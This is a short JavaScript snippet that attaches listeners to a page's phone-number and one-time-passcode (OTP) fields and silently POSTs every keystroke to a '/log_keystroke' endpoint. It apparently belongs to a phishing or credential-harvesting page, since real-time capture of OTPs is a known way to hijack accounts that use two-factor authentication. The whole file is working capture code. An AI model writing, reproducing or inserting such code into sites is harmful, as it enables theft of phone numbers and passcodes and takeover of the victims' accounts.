document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.querySelector('input[name="phone"]');
    const otpInput = document.querySelector('input[name="otp"]');

    // Function to send the keystrokes to our backend
    function logKeystroke(fieldName, currentValue) {
        // We use fetch() to send the data in the background without refreshing the page
        fetch('/log_keystroke', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                field: fieldName,
                value: currentValue
            })
        });
    }

    // Listen to the Phone Number input
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            logKeystroke('phone', e.target.value);
        });
    }

    // Listen to the OTP input
    if (otpInput) {
        otpInput.addEventListener('input', function(e) {
            logKeystroke('otp', e.target.value);
        });
    }
});